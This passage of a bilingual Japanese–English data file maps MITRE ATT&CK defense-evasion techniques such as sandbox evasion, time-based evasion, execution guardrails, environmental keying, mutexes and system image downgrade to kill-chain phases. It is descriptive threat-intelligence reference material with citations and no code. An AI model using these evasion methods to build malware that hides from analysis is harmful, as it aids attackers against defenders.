攻撃者は、セキュリティ監視ツール（Sysinternals、Wiresharkなど）や、分析または仮想化に関連するその他のシステムアーティファクトのチェックなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するためにいくつかの方法を使用する可能性があります。攻撃者はまた、正当なユーザーアクティビティをチェックして、分析環境にあるかどうかを判断するのに役立てることもあります。追加の方法には、一時的なサンドボックス内で動作することを避けるために、マルウェアコード内でスリープタイマーまたはループを使用することが含まれます。(引用: Unit 42 Pirpi July 2015)","Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",T1497.001,システムチェック,System Checks,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなシステムチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)

特定のチェックはターゲットや攻撃者によって異なりますが、システム情報を取得しVMEアーティファクトを検索するために、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、[システム情報ディスカバリ](https://attack.mitre.org/techniques/T1082)、[レジストリクエリ](https://attack.mitre.org/techniques/T1012)などの動作が含まれる場合があります。攻撃者は、メモリ、プロセス、ファイルシステム、ハードウェア、および/またはレジストリでVMEアーティファクトを検索する場合があります。攻撃者は、これらのチェックを1つのスクリプトに自動化するためにスクリプトを使用し、システムが仮想環境であると判断した場合にプログラムを終了させる場合があります。

チェックには、ホスト/ドメイン名やネットワークトラフィックのサンプルなどの一般的なシステムプロパティが含まれる場合があります。攻撃者はまた、ネットワークアダプタのアドレス、CPUコア数、利用可能なメモリ/ドライブサイズを確認する場合があります。実行されると、マルウェアは[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)を使用して、`malware`、`sample`、`hash`などの予期しない、あるいは分析に関連する名前付けアーティファクトを持つフォルダやファイルに保存されたかどうかを確認する場合があります。

その他の一般的なチェックには、これらのアプリケーションに固有の実行中のサービスの列挙、システムにインストールされているプログラム、仮想マシンアプリケーションに関連する文字列の製造元/製品フィールド、およびVME固有のハードウェア/プロセッサ命令が含まれる場合があります。(引用: McAfee Virtual Jan 2017) VMWareなどのアプリケーションでは、攻撃者は特別なI/Oポートを使用してコマンドを送信し、出力を受信することもできます。

ファン、温度、オーディオデバイスの存在などのハードウェアチェックも、仮想環境を示す可能性のある証拠を収集するために使用できます。攻撃者はまた、これらのデバイスから特定の測定値を照会する場合があります。(引用: Unit 42 OilRig Sept 2018)","Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.

Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1497,仮想化/サンドボックス回避,Virtualization/Sandbox Evasion,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな手段を用いる可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)

攻撃者は、セキュリティ監視ツール（Sysinternals、Wiresharkなど）や、分析または仮想化に関連するその他のシステムアーティファクトのチェックなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するためにいくつかの方法を使用する可能性があります。攻撃者はまた、正当なユーザーアクティビティをチェックして、分析環境にあるかどうかを判断するのに役立てることもあります。追加の方法には、一時的なサンドボックス内で動作することを避けるために、マルウェアコード内でスリープタイマーまたはループを使用することが含まれます。(引用: Unit 42 Pirpi July 2015)","Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",T1497.003,時間ベースの回避,Time Based Evasion,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな時間ベースの方法を採用する可能性があります。これには、稼働時間やシステムクロックなどの時間ベースのプロパティの列挙、および仮想マシン環境（VME）またはサンドボックス（特に自動化されているか、限られた時間しか動作しないもの）を回避するためのタイマーまたはその他のトリガーの使用が含まれる場合があります。

攻撃者は、プログラムによるスリープコマンドやネイティブシステムスケジューリング機能（例：[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)）を使用して初期実行時にマルウェアの機能を遅延させるなど、さまざまな時間ベースの回避策を用いる可能性があります。遅延は、特定の被害者の条件（例：システム時刻、イベントなど）が満たされるのを待つことに基づく場合もあれば、分析や精査を回避するためにスケジュールされた[多段階チャネル](https://attack.mitre.org/techniques/T1104)を使用する場合もあります。(引用: Deloitte Environment Awareness)

良性のコマンドやその他の操作も、マルウェアの実行を遅らせるために使用される場合があります。[Ping](https://attack.mitre.org/software/S0097)などのコマンドのループや不必要な繰り返しは、マルウェアの実行を遅らせ、自動分析環境の時間的しきい値を超える可能性があります。(引用: Revil Independence Day)(引用: Netskope Nitol) APIハンマリングとして一般的に知られている別のバリエーションは、実行を遅らせるために[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数へのさまざまな呼び出しを行うことを含みます（同時に、ジャンクデータで分析環境を過負荷にする可能性もあります）。(引用: Joe Sec Nymaim)(引用: Joe Sec Trickbot)

攻撃者はまた、時間を指標として使用してサンドボックスや分析環境を検出することもあります。特に、長時間の経過をシミュレートするために時間メカニズムを操作しようとするものを検出します。例えば、攻撃者は、スリープ関数の実行前後に環境のタイムスタンプの期待値をサンプリングして計算することにより、時間を加速させているサンドボックスを特定できる場合があります。(引用: ISACA Malware Tricks)","Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)

Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)

Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1480,実行ガードレール,Execution Guardrails,"攻撃者は、ターゲットに存在すると予想される、攻撃者が提供し環境固有の条件に基づいて実行またはアクションを制約するために、実行ガードレールを使用する可能性があります。ガードレールは、ペイロードが意図したターゲットに対してのみ実行されるようにし、攻撃者のキャンペーンによる巻き添え被害を軽減します。(引用: FireEye Kevin Mandia Guardrails) 攻撃者がガードレールとして使用するために提供できるターゲットシステムまたは環境に関する値には、特定のネットワーク共有名、接続された物理デバイス、ファイル、参加しているActive Directory（AD）ドメイン、およびローカル/外部IPアドレスが含まれる場合があります。(引用: FireEye Outlook Dec 2019)

ガードレールは、侵害または操作されることを意図していない環境での機能の公開を防ぐために使用できます。このガードレールの使用は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)の使用には、既知のサンドボックス値のチェックと、一致がない場合にのみ実行を継続することが含まれる場合がありますが、ガードレールの使用には、予想されるターゲット固有の値のチェックと、そのような一致がある場合にのみ実行を継続することが含まれます。

敵対者は、特定のユーザーエージェントを特定してブロックし、防御を回避し、攻撃の範囲を最も効果的な被害者とプラットフォームに絞り込むかもしれません。ユーザーエージェントは、ユーザーのソフトウェアアプリケーション、オペレーティングシステム、ベンダー、バージョンなどのデータを自己識別します。敵対者は、オペレーティングシステムの識別についてユーザーエージェントをチェックし、他のすべてのオペレーティングシステムを無視しながら、悪用可能なソフトウェアのマルウェアのみを提供するかもしれません。(引用：Trellix-Qakbot)","Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.

Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",T1480.001,環境キーイング,Environmental Keying,"攻撃者は、ペイロードやマルウェアのその他の機能を環境的にキーイングして、防御を回避し、特定のターゲット環境への実行を制約する可能性があります。環境キーイングは、ターゲットに存在すると予想される、攻撃者が提供する環境固有の条件に基づいて実行またはアクションを制約するために暗号化を使用します。環境キーイングは、特定のコンピューティング環境における特定の種類の値から暗号化/復号化キーを導き出すために暗号化技術を利用する[実行ガードレール](https://attack.mitre.org/techniques/T1480)の実装です。(引用: EK Clueless Agents)

値はターゲット固有の要素から導き出すことができ、暗号化されたペイロードの復号化キーを生成するために使用できます。ターゲット固有の値は、特定のネットワーク共有、物理デバイス、ソフトウェア/ソフトウェアバージョン、ファイル、参加しているADドメイン、システム時刻、およびローカル/外部IPアドレスから導き出すことができます。(引用: Kaspersky Gauss Whitepaper)(引用: Proofpoint Router Malvertising)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware) ターゲット固有の環境値から復号化キーを生成することにより、環境キーイングはサンドボックス検出、ウイルス対策検出、情報のクラウドソーシング、およびリバースエンジニアリングを困難にする可能性があります。(引用: Kaspersky Gauss Whitepaper)(引用: Ebowla: Genetic Malware) これらの困難さは、インシデント対応プロセスを遅らせ、攻撃者が戦術、技術、手順（TTP）を隠すのに役立ちます。

[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)と同様に、攻撃者はTTPを保護し検出を回避するために環境キーイングを使用する可能性があります。環境キーイングは、実行前にペイロードを復号化するためにターゲット固有の値を使用する暗号化されたペイロードをターゲットに配信するために使用できます。(引用: Kaspersky Gauss Whitepaper)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware)(引用: Demiguise Guardrail Router Logo) ペイロードを復号化するためにターゲット固有の値を利用することにより、攻撃者はペイロードと共に復号化キーをパッケージ化したり、潜在的に監視されているネットワーク接続を介して送信したりすることを回避できます。ターゲット固有の値を収集する手法によっては、暗号化されたペイロードのリバースエンジニアリングが非常に困難になる場合があります。(引用: Kaspersky Gauss Whitepaper) これは、侵害または操作されることを意図していない環境での機能の公開を防ぐために使用できます。

他の[実行ガードレール](https://attack.mitre.org/techniques/T1480)と同様に、環境キーイングは、侵害されたり操作されたりすることを意図していない環境での機能の公開を防ぐために使用できます。この活動は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)の使用には、既知のサンドボックス値のチェックと、一致がない場合にのみ実行を継続することが含まれる場合がありますが、環境キーイングの使用には、復号化とそれに続く実行が成功するために一致する必要がある、予想されるターゲット固有の値のチェックが含まれます。","Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)

Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1480,実行ガードレール,Execution Guardrails,"攻撃者は、ターゲットに存在すると予想される、攻撃者が提供し環境固有の条件に基づいて実行またはアクションを制約するために、実行ガードレールを使用する可能性があります。ガードレールは、ペイロードが意図したターゲットに対してのみ実行されるようにし、攻撃者のキャンペーンによる巻き添え被害を軽減します。(引用: FireEye Kevin Mandia Guardrails) 攻撃者がガードレールとして使用するために提供できるターゲットシステムまたは環境に関する値には、特定のネットワーク共有名、接続された物理デバイス、ファイル、参加しているActive Directory（AD）ドメイン、およびローカル/外部IPアドレスが含まれる場合があります。(引用: FireEye Outlook Dec 2019)

ガードレールは、侵害または操作されることを意図していない環境での機能の公開を防ぐために使用できます。このガードレールの使用は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)の使用には、既知のサンドボックス値のチェックと、一致がない場合にのみ実行を継続することが含まれる場合がありますが、ガードレールの使用には、予想されるターゲット固有の値のチェックと、そのような一致がある場合にのみ実行を継続することが含まれます。

敵対者は、特定のユーザーエージェントを特定してブロックし、防御を回避し、攻撃の範囲を最も効果的な被害者とプラットフォームに絞り込むかもしれません。ユーザーエージェントは、ユーザーのソフトウェアアプリケーション、オペレーティングシステム、ベンダー、バージョンなどのデータを自己識別します。敵対者は、オペレーティングシステムの識別についてユーザーエージェントをチェックし、他のすべてのオペレーティングシステムを無視しながら、悪用可能なソフトウェアのマルウェアのみを提供するかもしれません。(引用：Trellix-Qakbot)","Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.

Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",T1480.002,相互排他,Mutual Exclusion,"攻撃者は、マルウェアに関連付けられたミューテックスの存在に基づいて、実行またはアクションを制約する可能性があります。ミューテックスは、リソースへのアクセスを同期するために使用されるロックメカニズムです。特定の時点では、1つのスレッドまたはプロセスのみがミューテックスを取得できます。(引用: Microsoft Mutexes)

ローカルミューテックスは特定のプロセス内にのみ存在し、複数のスレッドがリソースへのアクセスを同期できるようにしますが、システムミューテックスは複数のプロセスの活動を同期するために使用できます。(引用: Microsoft Mutexes) 特定のマルウェアに関連付けられた一意のシステムミューテックスを作成することにより、攻撃者はシステムが既に侵害されているかどうかを確認できます。(引用: Sans Mutexes 2012)

Linux環境では、マルウェアは代わりにミューテックスファイルへのロック取得を試みる可能性があります。マルウェアがロックを取得できた場合、実行を継続します。失敗した場合は、自身の2番目のインスタンスを作成することを避けるために終了します。(引用: Intezer RedXOR 2021)(引用: Deep Instinct BPFDoor 2023)

ミューテックス名はハードコードされているか、予測可能なアルゴリズムを使用して動的に生成される場合があります。(引用: ICS Mutexes 2015)","Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)

While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)

In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)

Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1601,システムイメージの変更,Modify System Image,"攻撃者は、防御を弱体化させ、自身に新しい機能を提供するために、組み込みネットワークデバイスのオペレーティングシステムに変更を加える可能性があります。このようなデバイスでは、オペレーティングシステムは通常モノリシックであり、デバイスの機能と能力のほとんどは単一ファイルに含まれています。

オペレーティングシステムを変更するために、攻撃者は通常、この1つのファイルに影響を与え、それを置き換えるか変更するだけで済みます。これは、即時の効果を得るためにシステム実行中にメモリ内でライブで行うことも、ネットワークデバイスの次回の起動時に変更を実装するためにストレージで行うこともできます。","Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.

To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",T1601.002,システムイメージのダウングレード,Downgrade System Image,"攻撃者は、セキュリティを弱体化させるために、ネットワークデバイスのオペレーティングシステムの古いバージョンをインストールする可能性があります。ネットワークデバイス上の古いオペレーティングシステムのバージョンは、多くの場合、暗号化強度が弱く、一般的に防御機能が少ないか、更新されていません。(引用: Cisco Synful Knock Evolution)

組み込みデバイスでは、バージョンのダウングレードは通常、ストレージ内のオペレーティングシステムファイルを置き換えるだけで済みます。ほとんどの組み込みデバイスでは、これは目的のバージョンのオペレーティングシステムファイルのコピーをダウンロードし、次回のシステム再起動時にそのファイルから起動するようにデバイスを再構成することで達成できます。その後、攻撃者はデバイスを再起動してすぐに変更を実装することも、システムが次回再起動するまで待つこともできます。

システムイメージを古いバージョンにダウングレードすると、[暗号化の弱体化](https://attack.mitre.org/techniques/T1600)などの動作を可能にすることで、攻撃者が防御を回避できるようになる可能性があります。システムイメージのダウングレードは単独で行うことも、[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)と組み合わせて使用することもできます。","Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)

